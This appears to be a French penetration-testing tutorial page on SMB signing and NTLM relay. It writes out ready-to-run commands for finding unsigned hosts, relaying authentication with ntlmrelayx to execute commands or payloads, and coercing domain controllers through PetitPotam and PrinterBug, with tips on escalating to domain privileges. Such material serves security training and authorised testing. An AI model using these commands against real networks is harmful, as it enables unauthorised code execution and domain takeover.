---
title: "Signature et relais : faiblesses de la signature des messages SMB et relais NTLM"
order: 2
description: "La signature SMB lie cryptographiquement une session à son client authentifié ; quand la signature n'est pas requise, un attaquant relaie l'authentification NTLM d'une victime vers un autre serveur et y agit en tant que victime. Combiné à une coercition qui force une cible à s'authentifier, le relais transforme une authentification capturée en exécution de code ou en privilèges sur un second hôte."
keywords:
  - smb signing
  - ntlm relay
  - ntlmrelayx
  - coercion
  - petitpotam
---

# Signature et relais

La signature SMB ajoute un code d'authentification de message à chaque paquet, dérivé de la session, de sorte qu'une session ne peut être ni détournée ni relayée. Lorsqu'un serveur n'exige pas la signature, cette protection est absente et l'authentification NTLM devient relayable : un attaquant qui reçoit l'authentification NTLM d'une victime (en la contraignant ou en la capturant) transmet cette même authentification à un second serveur qui n'exige pas la signature, y complétant le handshake en tant que victime, sans jamais connaître le mot de passe de celle-ci. L'authentification est active, l'attaquant détient donc ensuite une session sur l'hôte vers lequel le relais a été effectué, avec les privilèges de la victime.

## Pourquoi cela fonctionne, et les verrous

NTLM est un protocole défi-réponse sans liaison au serveur spécifique, de sorte que les messages que le client calcule pour le serveur A sont tout aussi valides sur le serveur B. La signature SMB (et le channel binding pour d'autres protocoles) est ce qui les lierait ; sans signature requise sur la destination, le relais réussit. Vérifiez d'abord la posture de signature :

```bash
# which hosts do NOT require signing (relay targets)
nxc smb <subnet> --gen-relay-list relay_targets.txt     # writes hosts with signing:False
nxc smb <target>                                        # "signing:False" in the line
```

## La chaîne de relais

```bash
# 1. set up the relay to the signing-disabled targets, asking for a shell/exec on success
impacket-ntlmrelayx -tf relay_targets.txt -smb2support
#    -c 'powershell -enc ...'   run a command on relay   | -e payload.exe
#    --escalate-user <user>     (LDAP target) grant rights | -i  interactive SMB client
# 2. drive a victim's authentication to the attacker so it can be relayed:
#    - coerce a server/DC to authenticate to the attacker (PetitPotam/PrinterBug/DFSCoerce)
#    - or capture it by poisoning name resolution (Responder) and set SMB/HTTP to OFF there
```

Deux moitiés : le relais (`ntlmrelayx`) attend de transmettre l'authentification aux cibles, et une technique de coercition ou de capture fait qu'une victime s'authentifie auprès de l'attaquant. La coercition est le déclencheur fiable : un compte machine forcé à s'authentifier (via MS-EFSRPC/PetitPotam, le PrinterBug MS-RPRN ou DFSCoerce) relayé vers LDAP peut escalader, et relayé vers SMB peut exécuter du code sur un autre hôte.

```bash
# coerce a target to authenticate to the attacker host (pairs with ntlmrelayx)
impacket-petitpotam <attacker-ip> <target-dc>
printerbug.py 'DOM/user:pass@<target>' <attacker-ip>
```

## Notes d'exploitation

- La destination ne doit pas exiger la signature ; les contrôleurs de domaine l'exigent par défaut (les DC sont donc de mauvaises destinations de relais SMB), mais les serveurs ordinaires ne le font fréquemment pas. Le scan `--gen-relay-list` produit l'ensemble des cibles.
- Relayer vers LDAP/LDAPS sur un DC permet l'escalade (par exemple l'octroi de droits au compte machine de la victime, ou RBCD), tandis que relayer vers SMB sur un serveur y donne l'exécution de commandes ; choisissez le protocole de destination selon l'objectif.
- La coercition est ce qui rend le relais fiable plutôt qu'opportuniste : forcer un compte machine privilégié à s'authentifier et le relayer est un chemin standard vers l'escalade de domaine ; les techniques de coercition sont des méthodes de domaine qui s'articulent avec cette surface de fichiers.
- Le relais inter-protocole (HTTP vers LDAP, etc.) élargit les possibilités ; `ntlmrelayx` prend en charge plusieurs protocoles de destination.

## Outils

- [Impacket ntlmrelayx](https://github.com/fortra/impacket)
- [NetExec](https://github.com/Pennyw0rth/NetExec)
- [Responder](https://github.com/lgandx/Responder)

## Références

- [MS-SMB2 : signature](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/)
- [Microsoft : recommandations sur le relais NTLM et la signature](https://learn.microsoft.com/en-us/security/)
